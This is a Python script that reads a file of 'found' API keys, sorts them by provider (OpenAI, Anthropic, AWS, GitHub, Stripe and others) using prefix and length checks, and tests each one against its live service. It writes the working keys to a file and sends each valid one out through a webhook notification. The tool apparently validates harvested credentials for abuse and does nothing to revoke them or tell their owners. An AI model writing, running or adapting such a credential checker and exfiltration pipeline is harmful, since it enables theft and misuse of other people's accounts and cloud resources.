"""
Script to test all keys in found_api_keys.txt and save working ones to working_api_keys.txt
"""
import re
import time
from key_validator import KeyValidator
from config import API_KEY_PATTERNS
from webhook_notifier import send_webhook_notification

def identify_key_type(key):
    """
    Identify the type of API key based on patterns
    """
    # Test each pattern type
    for key_type, patterns in API_KEY_PATTERNS.items():
        for pattern in patterns:
            match = pattern.search(key)
            if match:
                # Extract the key from match groups if available
                if match.groups():
                    extracted_key = match.group(1)
                    # Check if the extracted key matches our input key
                    if extracted_key == key.strip('"\''):
                        return key_type
                else:
                    # Full match - check if it matches exactly
                    matched = match.group(0)
                    if matched == key or matched.strip('"\'') == key.strip('"\''):
                        return key_type
    
    # Fallback: Try to identify by prefix/format
    key_clean = key.strip('"\'').strip()
    
    if key_clean.startswith('sk-') and len(key_clean) == 51:
        return 'openai_standard'
    elif key_clean.startswith('sk-proj-'):
        return 'openai_project'
    elif key_clean.startswith('sk-ant-api03-'):
        return 'anthropic'
    elif key_clean.startswith('AIza') and len(key_clean) == 39:
        return 'google_gemini'
    elif key_clean.startswith('hf_') and len(key_clean) == 37:
        return 'huggingface'
    elif key_clean.startswith('pplx-'):
        return 'perplexity'
    elif key_clean.startswith('AKIA') and len(key_clean) == 20:
        return 'aws'
    elif key_clean.startswith('ghp_') and len(key_clean) == 40:
        return 'github'
    elif key_clean.startswith('sk_live_') or key_clean.startswith('pk_live_'):
        return 'stripe'
    
    return None

def test_all_keys():
    """
    Read all keys from found_api_keys.txt, test them, and save working ones
    """
    validator = KeyValidator()
    
    # Read all keys
    print("📖 Reading keys from found_api_keys.txt...")
    try:
        with open("found_api_keys.txt", "r", encoding="utf-8") as f:
            keys = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
    except FileNotFoundError:
        print("❌ found_api_keys.txt not found!")
        return
    
    print(f"✅ Found {len(keys)} keys to test\n")
    
    # Remove duplicates
    unique_keys = list(set(keys))
    print(f"🔍 Testing {len(unique_keys)} unique keys...\n")
    
    working_keys = []
    tested = 0
    working_count = 0
    
    # Open working keys file for writing
    with open("working_api_keys.txt", "w", encoding="utf-8") as working_file:
        
        for i, key in enumerate(unique_keys, 1):
            # Identify key type
            key_type = identify_key_type(key)
            
            if not key_type:
                # Skip keys we can't identify
                print(f"[{i}/{len(unique_keys)}] ⏭️  Skipped (unknown type): {key[:30]}...")
                continue
            
            # Test the key
            print(f"[{i}/{len(unique_keys)}] 🧪 Testing {key_type}: {key[:40]}...", end=" ", flush=True)
            tested += 1
            
            try:
                is_valid, message = validator.validate_key(key_type, key)
                
                if is_valid:
                    working_count += 1
                    working_keys.append((key_type, key, message))
                    working_file.write(f"{key}\n")
                    working_file.flush()
                    print(f"✅ WORKING! ({message})")
                    # Send webhook notification
                    send_webhook_notification(key, key_type, message)
                else:
                    print(f"❌ Invalid ({message[:50]})")
            except Exception as e:
                print(f"❌ Error: {str(e)[:50]}")
            
            # Small delay to avoid rate limiting
            time.sleep(0.1)
    
    print(f"\n{'='*60}")
    print(f"📊 Summary:")
    print(f"   Total keys: {len(keys)}")
    print(f"   Unique keys: {len(unique_keys)}")
    print(f"   Tested: {tested}")
    print(f"   ✅ Working: {working_count}")
    print(f"   ❌ Invalid: {tested - working_count}")
    print(f"\n💾 Working keys saved to working_api_keys.txt")

if __name__ == "__main__":
    test_all_keys()

